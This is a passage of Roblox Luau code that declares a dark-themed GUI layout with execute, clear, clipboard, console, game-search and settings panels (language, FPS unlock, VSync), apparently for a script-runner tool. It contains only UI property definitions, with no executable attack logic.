						create("TextButton", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("303030"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "executeBox", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 22), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(1, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://12778482262", 
								Name = "icon", 
								Position = UDim2.new(1, -6, 0.5, 0), 
								Size = UDim2.new(0, 14, 0, 14)
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("TextLabel", { 
								LanguageItem = {
									property = "Text",
									identifier = "Execute"
								},
								AnchorPoint = Vector2.new(0, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
								FontSize = Enum.FontSize.Size11, 
								Name = "title", 
								Position = UDim2.new(0, 6, 0.5, 0), 
								Size = UDim2.new(1, -30, 1, 0), 
								TextColor3 = Color3.fromHex("ebebeb"), 
								TextSize = 11, 
								TextXAlignment = Enum.TextXAlignment.Left
							})
						}),
						create("TextButton", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("303030"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "clearBox", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 22), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(1, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://12778483354", 
								Name = "icon", 
								Position = UDim2.new(1, -6, 0.5, 0), 
								Size = UDim2.new(0, 14, 0, 14)
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("TextLabel", { 
								LanguageItem = {
									property = "Text",
									identifier = "Clear"
								},
								AnchorPoint = Vector2.new(0, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
								FontSize = Enum.FontSize.Size11, 
								Name = "title", 
								Position = UDim2.new(0, 6, 0.5, 0), 
								Size = UDim2.new(1, -30, 1, 0), 
								TextColor3 = Color3.fromHex("ebebeb"), 
								TextSize = 11, 
								TextXAlignment = Enum.TextXAlignment.Left
							})
						}),
						create("Frame", { 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							Name = "separator", 
							Size = UDim2.new(1, 0, 0, 1)
						}, {
							create("Frame", { 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("363636"), 
								BorderSizePixel = 0, 
								Name = "bar", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								Size = UDim2.new(1, -8, 1, 0)
							}, {
								create("UIGradient", { 
									Name = "gradient", 
									Transparency = NumberSequence.new({ 
										NumberSequenceKeypoint.new(0, 1), 
										NumberSequenceKeypoint.new(0.1, 0.28), 
										NumberSequenceKeypoint.new(0.28, 0), 
										NumberSequenceKeypoint.new(0.72, 0), 
										NumberSequenceKeypoint.new(0.9, 0.28), 
										NumberSequenceKeypoint.new(1, 1)
									})
								})
							})
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "Clipboard"
							},
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size12, 
							Name = "clipboardLabel", 
							Size = UDim2.new(1, 0, 0, 16), 
							TextColor3 = Color3.fromHex("bebebe"), 
							TextSize = 12, 
							TextXAlignment = Enum.TextXAlignment.Left, 
							TextYAlignment = Enum.TextYAlignment.Bottom
						}),
						create("TextButton", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("303030"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "executeClip", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 22), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(1, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://12778483177", 
								Name = "icon", 
								Position = UDim2.new(1, -6, 0.5, 0), 
								Size = UDim2.new(0, 14, 0, 14)
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("TextLabel", { 
								LanguageItem = {
									property = "Text",
									identifier = "Execute"
								},
								AnchorPoint = Vector2.new(0, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
								FontSize = Enum.FontSize.Size11, 
								Name = "title", 
								Position = UDim2.new(0, 6, 0.5, 0), 
								Size = UDim2.new(1, -30, 1, 0), 
								TextColor3 = Color3.fromHex("ebebeb"), 
								TextSize = 11, 
								TextXAlignment = Enum.TextXAlignment.Left
							})
						}),
						create("TextButton", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("303030"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "copyClip", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 22), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(1, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://12778483077", 
								Name = "icon", 
								Position = UDim2.new(1, -6, 0.5, 0), 
								Size = UDim2.new(0, 14, 0, 14)
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("TextLabel", { 
								LanguageItem = {
									property = "Text",
									identifier = "CopyScript"
								},
								AnchorPoint = Vector2.new(0, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
								FontSize = Enum.FontSize.Size11, 
								Name = "title", 
								Position = UDim2.new(0, 6, 0.5, 0), 
								Size = UDim2.new(1, -30, 1, 0), 
								TextColor3 = Color3.fromHex("ebebeb"), 
								TextSize = 11, 
								TextXAlignment = Enum.TextXAlignment.Left
							})
						}),
						create("TextButton", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("303030"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "loadClip", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 22), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(1, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://12778482928", 
								Name = "icon", 
								Position = UDim2.new(1, -6, 0.5, 0), 
								Size = UDim2.new(0, 14, 0, 14)
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("TextLabel", { 
								LanguageItem = {
									property = "Text",
									identifier = "LoadScript"
								},
								AnchorPoint = Vector2.new(0, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
								FontSize = Enum.FontSize.Size11, 
								Name = "title", 
								Position = UDim2.new(0, 6, 0.5, 0), 
								Size = UDim2.new(1, -30, 1, 0), 
								TextColor3 = Color3.fromHex("ebebeb"), 
								TextSize = 11, 
								TextXAlignment = Enum.TextXAlignment.Left
							})
						})
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					})
				})
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(1, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "games", 
				Position = UDim2.new(1, 0, 0.5, 0), 
				Size = UDim2.new(1, -38, 1, 0), 
				Visible = false
			}, {
				create("TextBox", { 
					LanguageItem = {
						property = "PlaceholderText",
						identifier = "Search..."
					},
					BackgroundColor3 = Color3.fromHex("181818"), 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size11, 
					Name = "searchInput", 
					Position = UDim2.new(0, 8, 0, 8), 
					Size = UDim2.new(1, -90, 0, 30), 
					Text = "", 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 11, 
					TextXAlignment = Enum.TextXAlignment.Left
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("UIPadding", { 
						Name = "padding", 
						PaddingLeft = UDim.new(0, 8), 
						PaddingRight = UDim.new(0, 8)
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					})
				}),
				create("ScrollingFrame", { 
					Active = true, 
					AnchorPoint = Vector2.new(0.5, 1), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					BorderSizePixel = 0, 
					CanvasSize = UDim2.new(0, 0, 0, 0), 
					Name = "container", 
					Position = UDim2.new(0.5, 0, 1, -7), 
					ScrollBarImageColor3 = Color3.fromHex("000000"), 
					ScrollBarThickness = 0, 
					Size = UDim2.new(1, -14, 1, -52)
				}, {
					create("UIGridLayout", { 
						CellPadding = UDim2.new(0, 8, 0, 6), 
						CellSize = UDim2.new(0, 0, 0, 0), 
						Name = "grid", 
						SortOrder = Enum.SortOrder.LayoutOrder
					}),
					create("UIPadding", { 
						Name = "padding", 
						PaddingBottom = UDim.new(0, 1), 
						PaddingLeft = UDim.new(0, 1), 
						PaddingRight = UDim.new(0, 1), 
						PaddingTop = UDim.new(0, 1)
					})
				}),
				create("TextButton", {
					LanguageItem = {
						property = "Text",
						identifier = "Search"
					}, 
					AnchorPoint = Vector2.new(1, 0), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("181818"), 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size11, 
					Name = "search", 
					Position = UDim2.new(1, -8, 0, 8), 
					Size = UDim2.new(0, 66, 0, 30), 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 11
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					})
				})
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(1, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "console", 
				Position = UDim2.new(1, 0, 0.5, 0), 
				Size = UDim2.new(1, -38, 1, 0), 
				Visible = false
			}, {
				create("Frame", { 
					AnchorPoint = Vector2.new(0.5, 0), 
					BackgroundColor3 = Color3.fromHex("181818"), 
					Name = "main", 
					Position = UDim2.new(0.5, 0, 0, 8), 
					Size = UDim2.new(1, -16, 1, -54)
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("ScrollingFrame", { 
						Active = true, 
						AnchorPoint = Vector2.new(0.5, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						BorderSizePixel = 0, 
						BottomImage = "rbxassetid://12651249430", 
						CanvasSize = UDim2.new(1, -16, 1, -16), 
						MidImage = "rbxassetid://12651249103", 
						Name = "container", 
						Position = UDim2.new(0.5, 0, 0.5, 0), 
						ScrollBarImageColor3 = Color3.fromHex("484848"), 
						ScrollBarThickness = 4, 
						Size = UDim2.new(1, -16, 1, -16), 
						TopImage = "rbxassetid://12651248921"
					}, {
						create("TextLabel", { 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "content", 
							RichText = true, 
							Size = UDim2.new(1, 0, 1, 0), 
							Text = "", 
							TextColor3 = Color3.fromHex("b2b2b2"), 
							TextSize = 11, 
							TextTruncate = Enum.TextTruncate.AtEnd, 
							TextWrap = true, 
							TextWrapped = true, 
							TextXAlignment = Enum.TextXAlignment.Left, 
							TextYAlignment = Enum.TextYAlignment.Top
						})
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					})
				}),
				create("Frame", { 
					AnchorPoint = Vector2.new(0.5, 1), 
					BackgroundColor3 = Color3.fromHex("181818"), 
					Name = "bottom", 
					Position = UDim2.new(0.5, 0, 1, -8), 
					Size = UDim2.new(1, -16, 0, 30)
				}, {
					create("TextButton", { 
						AnchorPoint = Vector2.new(0, 0.5), 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("303030"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "clearConsole", 
						Position = UDim2.new(0, 4, 0.5, 0), 
						Size = UDim2.new(0, 63, 0, 22), 
						Text = "", 
						TextColor3 = Color3.fromHex("000000"), 
						TextSize = 14
					}, {
						create("ImageLabel", { 
							AnchorPoint = Vector2.new(1, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							Image = "rbxassetid://12778483354", 
							Name = "icon", 
							Position = UDim2.new(1, -6, 0.5, 0), 
							Size = UDim2.new(0, 14, 0, 14)
						}),
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "ClearConsole"
							},
							AnchorPoint = Vector2.new(0, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(0, 6, 0.5, 0), 
							Size = UDim2.new(1, -30, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						})
					}),
					create("TextButton", { 
						AnchorPoint = Vector2.new(1, 0.5), 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("303030"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "copyConsole", 
						Position = UDim2.new(1, -4, 0.5, 0), 
						Size = UDim2.new(0, 109, 0, 22), 
						Text = "", 
						TextColor3 = Color3.fromHex("000000"), 
						TextSize = 14
					}, {
						create("ImageLabel", { 
							AnchorPoint = Vector2.new(1, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							Image = "rbxassetid://12778483077", 
							Name = "icon", 
							Position = UDim2.new(1, -6, 0.5, 0), 
							Size = UDim2.new(0, 14, 0, 14)
						}),
						create("UICorner", { 
							CornerRadius = UDim.new(0, 4), 
							Name = "corner"
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "CopyConsole"
							},
							AnchorPoint = Vector2.new(0, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(0, 6, 0.5, 0), 
							Size = UDim2.new(1, -30, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						})
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					})
				})
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(1, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "settings", 
				Position = UDim2.new(1, 0, 0.5, 0), 
				Size = UDim2.new(1, -38, 1, 0), 
				Visible = false
			}, {
				create("ScrollingFrame", { 
					AnchorPoint = Vector2.new(0, 0.5), 
					BackgroundTransparency = 1, 
					BorderSizePixel = 0, 
					CanvasSize = UDim2.new(), 
					Name = "left", 
					Position = UDim2.new(0, 8, 0.5, 0), 
					ScrollBarThickness = 0, 
					Size = UDim2.new(0.5, -12, 1, -16)
				}, {
					create("UIListLayout", { 
						Name = "list", 
						Padding = UDim.new(0, 8), 
						SortOrder = Enum.SortOrder.LayoutOrder
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Name = "languages", 
						Size = UDim2.new(1, 0, 0, 28)
					}, {
						create("TextButton", { 
							AnchorPoint = Vector2.new(0, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("181818"), 
							BorderColor3 = Color3.fromHex("1b2a35"), 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "indicator", 
							Position = UDim2.new(0, 0, 0.5, 0), 
							Size = UDim2.new(0, 28, 0, 28), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://13084553682", 
								Name = "icon", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								Size = UDim2.new(1, -8, 1, -8)
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							})
						}),
						create("TextButton", { 
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(1, -36, 1, 0), 
							Text = "English", 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							})
						}),
						create("Frame", { 
							AnchorPoint = Vector2.new(1, 0), 
							BackgroundColor3 = Color3.fromHex("181818"), 
							Name = "drop", 
							Position = UDim2.new(1, 0, 1, 8), 
							Size = UDim2.new(1, -36, 0, 156), 
							Visible = false, 
							ZIndex = 2
						}, {
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("ScrollingFrame", { 
								Active = true, 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								BorderSizePixel = 0, 
								BottomImage = "rbxassetid://12651249430", 
								CanvasSize = UDim2.new(0, 0, 0, 0), 
								MidImage = "rbxassetid://12651249103", 
								Name = "container", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								ScrollBarImageColor3 = Color3.fromHex("141414"), 
								ScrollBarThickness = 4, 
								Size = UDim2.new(1, -16, 1, -16), 
								TopImage = "rbxassetid://12651248921", 
								ZIndex = 2
							}, {
								create("UIListLayout", { 
									Name = "list", 
									Padding = UDim.new(0, 6), 
									SortOrder = Enum.SortOrder.LayoutOrder
								}),
								create("UIPadding", { 
									Name = "padding", 
									PaddingBottom = UDim.new(0, 1), 
									PaddingLeft = UDim.new(0, 1), 
									PaddingRight = UDim.new(0, 1), 
									PaddingTop = UDim.new(0, 1)
								})
							})
						})
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						BorderSizePixel = 0, 
						Name = "separator", 
						Size = UDim2.new(1, 0, 0, 11)
					}, {
						create("Frame", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BorderSizePixel = 0, 
							Name = "bar", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 1)
						}, {
							create("UIGradient", { 
								Color = ColorSequence.new({ 
									ColorSequenceKeypoint.new(0, Color3.fromHex("3c3c3c")), 
									ColorSequenceKeypoint.new(1, Color3.fromHex("3c3c3c"))
								}), 
								Transparency = NumberSequence.new({ 
									NumberSequenceKeypoint.new(0, 1), 
									NumberSequenceKeypoint.new(0.2, 0), 
									NumberSequenceKeypoint.new(0.8, 0), 
									NumberSequenceKeypoint.new(1, 1)
								})
							})
						})
					}),
					create("TextButton", { 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "unlockFps", 
						Size = UDim2.new(1, 0, 0, 28), 
						Text = "", 
						TextColor3 = Color3.fromHex("000000"), 
						TextSize = 14
					}, {
						create("Frame", { 
							AnchorPoint = Vector2.new(0, 0.5), 
							BackgroundColor3 = Color3.fromHex("181818"), 
							Name = "indicator", 
							Position = UDim2.new(0, 0, 0.5, 0), 
							Size = UDim2.new(0, 28, 0, 28)
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							}),
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://13107126808", 
								ImageTransparency = uiSettings.unlockFps and 0 or 1, 
								Name = "icon", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								Size = UDim2.new(1, -8, 1, -8)
							})
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "UnlockFPS"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(1, -40, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						})
					}),
					create("TextButton", { 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "vSync", 
						Size = UDim2.new(1, 0, 0, 28), 
						Text = "", 
						TextColor3 = Color3.fromHex("000000"), 
						TextSize = 14
					}, {
						create("Frame", { 
							AnchorPoint = Vector2.new(0, 0.5), 
							BackgroundColor3 = Color3.fromHex("181818"), 
							Name = "indicator", 
							Position = UDim2.new(0, 0, 0.5, 0), 
							Size = UDim2.new(0, 28, 0, 28)
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							}),
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://13107126808", 
								ImageTransparency = uiSettings.vSync and 0 or 1, 
								Name = "icon", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								Size = UDim2.new(1, -8, 1, -8)
							})
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "VSync"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(1, -40, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						})
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Name = "fpsValue", 
						Size = UDim2.new(1, 0, 0, 38)
					}, {
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "FPS"
							},
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(0, 4, 0, 0), 
							Size = UDim2.new(1, -8, 0, 24), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						}),
						create("TextLabel", { 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "value", 
							Position = UDim2.new(0, 4, 0, 0), 
							Size = UDim2.new(1, -8, 0, 24), 
							Text = "60", 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Right
						}),
						create("Frame", { 
							AnchorPoint = Vector2.new(0.5, 1), 
							BackgroundColor3 = Color3.fromHex("181818"), 
							ClipsDescendants = true, 
							Name = "container", 
							Position = UDim2.new(0.5, 0, 1, 0), 
